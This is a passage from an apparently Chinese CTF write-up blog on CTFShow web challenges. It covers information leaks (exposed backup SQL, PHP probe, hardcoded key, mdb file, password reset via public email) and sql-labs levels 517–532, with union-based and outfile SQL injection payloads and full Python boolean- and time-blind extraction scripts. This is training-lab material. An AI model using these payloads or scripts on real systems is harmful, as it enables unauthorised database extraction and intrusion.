title="WEB-15-社工"></a>WEB-15-社工</h2><p>提示：公开的信息比如邮箱，可能造成信息泄露，产生严重后果<br>在页面找到邮箱<code>1156631961@qq.com</code><br>访问后台<code>admin</code>，发现可以重置密码，密保问题为所在的城市，直接查看QQ邮箱，显示为西安，填写后成功重置密码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507231029343.png"></p><p>进行登录即可<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507231030123.png"></p><h2 id="WEB-16-PHP探针"><a href="#WEB-16-PHP探针" class="headerlink" title="WEB-16-PHP探针"></a>WEB-16-PHP探针</h2><p>提示：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露<br><code>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息</code><br>直接访问<code>tz.php</code>，然后找到<code>phpinfo</code>，即可找到<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507231036363.png"></p><h2 id="WEB-17-SQL泄露"><a href="#WEB-17-SQL泄露" class="headerlink" title="WEB-17-SQL泄露"></a>WEB-17-SQL泄露</h2><p>提示：备份的sql文件会泄露敏感信息<br>目录扫描，找到SQL备份文件目录<code>backup.sql</code>，直接访问即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/ctfshow]<br>└─# curl http://3f272bfe-4912-47f2-95a3-ddcc3af043d7.challenge.ctf.show/backup.sql <br>CREATE DATABASE IF NOT EXISTS ctfshow;<br>USE ctfshow;<br><br>--<br>-- Table structure <span class="hljs-keyword">for</span> table `products`<br>--<br><br>CREATE TABLE IF NOT EXISTS `products` (<br>  `product_id` int(11) NOT NULL,<br>  `name` varchar(100) NOT NULL,<br>  `sku` varchar(14) NOT NULL,<br>  `price` decimal(15,2) NOT NULL,<br>  `image` varchar(50) NOT NULL,<br>  PRIMARY KEY (`product_id`),<br>  UNIQUE KEY `sku` (`sku`)<br>) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;<br><br>CREATE TABLE `ctfshow_secret` (<br>  `secret` varchar(255) DEFAULT NULL<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8;<br><br><br>INSERT INTO `ctfshow_secret` VALUES (<span class="hljs-string">&#x27;ctfshow&#123;d61ad1a1-182c-4438-a274-ae9a17633354&#125;&#x27;</span>);<br><br>--<br>-- Dumping data <span class="hljs-keyword">for</span> table `products`<br>--<br><br>INSERT INTO `products` (`product_id`, `name`, `sku`, `price`, `image`) VALUES<br>(1, <span class="hljs-string">&#x27;Iphone&#x27;</span>, <span class="hljs-string">&#x27;IPHO001&#x27;</span>, <span class="hljs-string">&#x27;400.00&#x27;</span>, <span class="hljs-string">&#x27;images/iphone.jpg&#x27;</span>),<br>(2, <span class="hljs-string">&#x27;Camera&#x27;</span>, <span class="hljs-string">&#x27;CAME001&#x27;</span>, <span class="hljs-string">&#x27;700.00&#x27;</span>, <span class="hljs-string">&#x27;images/camera.jpg&#x27;</span>),<br>(3, <span class="hljs-string">&#x27;Watch&#x27;</span>, <span class="hljs-string">&#x27;WATC001&#x27;</span>, <span class="hljs-string">&#x27;100.00&#x27;</span>, <span class="hljs-string">&#x27;images/watch.jpg&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="WEB-18-js文件"><a href="#WEB-18-js文件" class="headerlink" title="WEB-18-js文件"></a>WEB-18-js文件</h2><p>提示：不要着急，休息，休息一会儿，玩101分给你flag<br>自己查看JS文件<code>js/Flappy_js.js</code>，找到<code>\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</code>，直接<code>unicode</code>解码，结果为<code>你赢了，去幺幺零点皮爱吃皮看看</code>，直接访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/ctfshow]<br>└─# curl http://28e3d780-ac84-4182-83da-3c45c1374bac.challenge.ctf.show/110.php <br>ctfshow&#123;c4e29974-08c8-454a-ac09-1f4c5ac86d4e&#125;<br></code></pre></td></tr></table></figure><h2 id="WEB-19-密钥泄露"><a href="#WEB-19-密钥泄露" class="headerlink" title="WEB-19-密钥泄露"></a>WEB-19-密钥泄露</h2><p>提示：密钥什么的，就不要放在前端了<br>查看页面源码，找到<code>$u===&#39;admin&#39; &amp;&amp; $p ===&#39;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#39;</code>，直接将请求包的pazzword修改即可<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507231057344.png"></p><h2 id="WEB-20-mdb文件泄露"><a href="#WEB-20-mdb文件泄露" class="headerlink" title="WEB-20-mdb文件泄露"></a>WEB-20-mdb文件泄露</h2><p>提示：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了<br>进行两次目录扫描，找到路径<code>/db/db.mdb</code>，下载文件<code>db.mdb</code>，使用记事本打开后，找到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;ctfshow_old_database&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTFShow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB入门</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFShow-WEB入门-sql-labs</title>
    <link href="/CTFShow/CTFShow-WEB%E5%85%A5%E9%97%A8-sql-labs/"/>
    <url>/CTFShow/CTFShow-WEB%E5%85%A5%E9%97%A8-sql-labs/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB-517-联合注入"><a href="#WEB-517-联合注入" class="headerlink" title="WEB-517-联合注入"></a>WEB-517-联合注入</h2><p>字符型注入，闭合方式是<code>&#39;</code></p><p>尝试<code>1&#39;--+</code>，发现报错，说明闭合正确</p><p>使用<strong>union 联合注入</strong></p><p>（1）、查看回显列数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1&#x27; order by 3--+<br></code></pre></td></tr></table></figure><p>发现有3列回显值</p><p>（2）、查看数据库中的所有数据库名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata--+<br></code></pre></td></tr></table></figure><p>找到数据库有：ctfshow</p><p>注：<code>schema_name</code>：记录数据库名称的列名值</p><p><code>group_concat</code>：将多行多列查询结果，显示在一行一列，并且多行结果之间用逗号”，”分隔；</p><p><code>information_schema.schemata</code>：记录数据库中所有数据库的名称</p><p>（3）、查看指定数据库中的所有表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;ctfshow&#x27;--+<br></code></pre></td></tr></table></figure><p>找到数据库ctfshow中有表名flag</p><p>（4）、查看表中的列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;flag&quot;--+<br></code></pre></td></tr></table></figure><p>找到表flag中包含的列名有id、flag</p><p>（5）、爆出flag的字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=-1&#x27; union select 1,flag,3 from ctfshow.flag--+<br></code></pre></td></tr></table></figure><h2 id="WEB-518-联合注入"><a href="#WEB-518-联合注入" class="headerlink" title="WEB-518-联合注入"></a>WEB-518-联合注入</h2><p>数字型注入，使用<code>?id=-1</code>即可</p><p>其余同上</p><h2 id="WEB-519-联合注入"><a href="#WEB-519-联合注入" class="headerlink" title="WEB-519-联合注入"></a>WEB-519-联合注入</h2><p>字符型注入，闭合方式是<code>&#39;)</code>，判断闭合方式：<code>?id=-1\</code></p><p>其余同上，使用<strong>union联合注入</strong></p><h2 id="WEB-520-联合注入"><a href="#WEB-520-联合注入" class="headerlink" title="WEB-520-联合注入"></a>WEB-520-联合注入</h2><p>字符型注入，闭合方式是<code>&quot;)</code></p><p>其余同上，使用<strong>union联合注入</strong></p><h2 id="WEB-521-bool盲注"><a href="#WEB-521-bool盲注" class="headerlink" title="WEB-521-bool盲注"></a>WEB-521-bool盲注</h2><p>字符型注入，闭合方式是<code>&#39;</code></p><p><strong>区别：输入数据库中存在的数据时，只回显<code>you are in.....</code>，输入数据库中不存的数据时，没有数据回显</strong></p><p>使用<strong>布尔盲注</strong>，一般推荐使用脚本来进行（二分法）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&#x27;http://a2b7cdbb-6cdf-45ad-82b6-7c83035cd645.challenge.ctf.show/?id=1%27and%20&#x27;</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) // <span class="hljs-number">2</span><br>            payload = <span class="hljs-string">f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)%23&#x27;</span>  <span class="hljs-comment">#查询数据库名称</span><br>            <br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; #查询数据库中的表名</span><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagpa&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; #查询数据库中的列名</span><br>            <span class="hljs-comment">#payload = f&#x27;if(ascii(substr((select group_concat(flag3a3) from ctfshow.flagpa),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; #查询flag的值</span><br>            <br>            r = requests.get(url=url + payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in...........&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br><br><br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += <span class="hljs-built_in">chr</span>(low)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h2 id="WEB-522-bool盲注"><a href="#WEB-522-bool盲注" class="headerlink" title="WEB-522-bool盲注"></a>WEB-522-bool盲注</h2><p>字符型注入，闭合方式时<code>&quot;</code></p><p><strong>区别：输入数据库中存在的数据时，只回显<code>you are in.....</code>，输入数据库中不存的数据时，没有数据回显</strong></p><p>使用<strong>布尔盲注</strong>，一般推荐使用脚本来进行（二分法）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&#x27;http://65284d44-0c8b-4958-aa9a-5ebfb9e114a7.challenge.ctf.show/?id=1%22and%20&#x27;</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) // <span class="hljs-number">2</span><br>            payload = <span class="hljs-string">f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)%23&#x27;</span>  <span class="hljs-comment">#查询数据库名称</span><br>            <br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; #查询数据库中的表名</span><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagpa&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; #查询数据库中的列名</span><br>            <span class="hljs-comment">#payload = f&#x27;if(ascii(substr((select group_concat(flag3a3) from ctfshow.flagpa),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; #查询flag的值</span><br>            <br>            r = requests.get(url=url + payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in...........&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br><br><br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += <span class="hljs-built_in">chr</span>(low)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h2 id="WEB-523-联合注入"><a href="#WEB-523-联合注入" class="headerlink" title="WEB-523-联合注入"></a>WEB-523-联合注入</h2><p>字符型注入，闭合方式为<code>&#39;))</code></p><p><strong>区别：输入数据库中存在的数据时提示使用outfile，输入数据库中不存在的数据时提示错误</strong></p><p>使用<strong>联合注入</strong>，把需要显示的字段输出到文件里面</p><p>（1）、查看数据库中所有数据库名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1&#x27;)) union select 1,group_concat(schema_name),3 from information_schema.schemata into outfile &quot;/var/www/html/5.txt&quot;--+<br></code></pre></td></tr></table></figure><p>（2）、查看数据库中的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1&#x27;)) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;ctfshow&quot; into outfile &quot;/var/www/html/6.txt&quot;--+<br></code></pre></td></tr></table></figure><p>（3）、查看表中的列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1&#x27;)) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;flagdk&quot; into outfile &quot;/var/www/html/7.txt&quot;--+<br></code></pre></td></tr></table></figure><p>（4）、查看数据库中的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?id=1&#x27;)) union select 1,group_concat(flag43),3 from ctfshow.flagdk into outfile &quot;/var/www/html/8.txt&quot;--+<br></code></pre></td></tr></table></figure><h2 id="WEB-524-bool盲注"><a href="#WEB-524-bool盲注" class="headerlink" title="WEB-524-bool盲注"></a>WEB-524-bool盲注</h2><p>和web-521一致</p><h2 id="WEB-525-时间盲注"><a href="#WEB-525-时间盲注" class="headerlink" title="WEB-525-时间盲注"></a>WEB-525-时间盲注</h2><p>字符型注入，闭合方式为<code>&#39;</code></p><p><strong>区别：不管数据库中是否存在数据，都显示<code>you are in .....</code></strong></p><p>使用<strong>时间盲注</strong>，sleep函数，推荐使用脚本来进行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&#x27;http://1fa03824-d1f6-4676-a61b-0625ee9247ad.challenge.ctf.show/?id=1%27and%20&#x27;</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) // <span class="hljs-number">2</span><br>            payload = <span class="hljs-string">f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(1),0)%23&#x27;</span>  <span class="hljs-comment"># 查询数据库名称</span><br>            <span class="hljs-comment">#payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),0)%23&#x27; #查询数据库中的表名</span><br>            <span class="hljs-comment">#payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagjugg&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),0)%23&#x27; #查询数据库中的列名</span><br>            <span class="hljs-comment">#payload = f&#x27;if(ascii(substr((select group_concat(flag423) from ctfshow.flagjugg),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),0)%23&#x27; #查询flag的值</span><br><br>            <span class="hljs-keyword">try</span>:<br>                r = requests.get(url=url + payload,timeout=<span class="hljs-number">0.5</span>)<br>                high = mid<br>            <span class="hljs-keyword">except</span>:<br>                low = mid + <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += <span class="hljs-built_in">chr</span>(low)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h2 id="WEB-526-时间盲注"><a href="#WEB-526-时间盲注" class="headerlink" title="WEB-526-时间盲注"></a>WEB-526-时间盲注</h2><p>字符型注入，闭合方式为<code>&quot;</code></p><p>同上述脚本一致，修改URL后面的编码即可</p><h2 id="WEB-527-POST注入-联合注入"><a href="#WEB-527-POST注入-联合注入" class="headerlink" title="WEB-527-POST注入&amp;联合注入"></a>WEB-527-POST注入&amp;联合注入</h2><p>字符型注入，闭合方式为<code>&#39;</code></p><p>使用<strong>联合注入</strong></p><p>（1）、查看回显的列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">aadmin&#x27; order by 2#<br></code></pre></td></tr></table></figure><p>（2）、查看当前的数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">aadmin&#x27; union select 1,group_concat(schema_name) from information_schema.schemata#<br></code></pre></td></tr></table></figure><p>（3）、查看数据库中的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">aadmin&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;#<br></code></pre></td></tr></table></figure><p>（4）、查看数据库表中的列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">aadmin&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&quot;flagugsd&quot;#<br></code></pre></td></tr></table></figure><p>（5）、查看flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">aadmin&#x27; union select 1,group_concat(flag43a) from ctfshow.flagugsd#<br></code></pre></td></tr></table></figure><h2 id="WEB-528-POST注入-联合注入"><a href="#WEB-528-POST注入-联合注入" class="headerlink" title="WEB-528-POST注入&amp;联合注入"></a>WEB-528-POST注入&amp;联合注入</h2><p>字符型注入，闭合方式为<code>&quot;)</code></p><p>同上述一致，修改闭合方式即可</p><h2 id="WEB-529-POST注入-bool盲注"><a href="#WEB-529-POST注入-bool盲注" class="headerlink" title="WEB-529-POST注入&amp;bool盲注"></a>WEB-529-POST注入&amp;bool盲注</h2><p>字符型注入，闭合方式为<code>&#39;</code></p><p><strong>区别：如果注入成功，会有一个<code>flag.jpg</code>的图片，注入失败，会有<code>slap.jpg</code>的图片</strong></p><p>使用Bbool盲注，推荐使用脚本来进行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&#x27;http://9301abaf-d8ee-4cc9-a060-6aad4a35035b.challenge.ctf.show/&#x27;</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) // <span class="hljs-number">2</span><br><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span><br>            payload = <span class="hljs-string">f&#x27;if(ascii(substr((select group_concat(flag4) from ctfshow.flag),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)&#x27;</span><br>           <br>            data = &#123;<br>                <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">f&quot;admin&#x27;) and <span class="hljs-subst">&#123;payload&#125;</span>#&quot;</span>,<br>                <span class="hljs-string">&#x27;passwd&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span><br>            &#125;<br>            r = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br><br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += <span class="hljs-built_in">chr</span>(low)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h2 id="WEB-530-POST注入-bool盲注"><a href="#WEB-530-POST注入-bool盲注" class="headerlink" title="WEB-530-POST注入&amp;bool盲注"></a>WEB-530-POST注入&amp;bool盲注</h2><p>字符型注入，闭合方式为<code>&quot;</code></p><p>同上述一致，修改闭合方式即可</p><h2 id="WEB-531-POST注入-bool盲注"><a href="#WEB-531-POST注入-bool盲注" class="headerlink" title="WEB-531-POST注入&amp;bool盲注"></a>WEB-531-POST注入&amp;bool盲注</h2><p>字符型注入，闭合方式为<code>&#39;</code></p><p>同上述一致，修改闭合方式即可</p><h2 id="WEB-532-POST注入-时间盲注"><a href="#WEB-532-POST注入-时间盲注" class="headerlink" title="WEB-532-POST注入&amp;时间盲注"></a>WEB-532-POST注入&amp;时间盲注</h2><p>字符型注入，闭合方式为<code>&quot;)</code></p><p>使用时间盲注，推荐使用脚本来进行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&#x27;http://b9573089-3765-4e72-bb62-e2c16b6a9a38.challenge.ctf.show/&#x27;</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) // <span class="hljs-number">2</span><br><br>            <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from 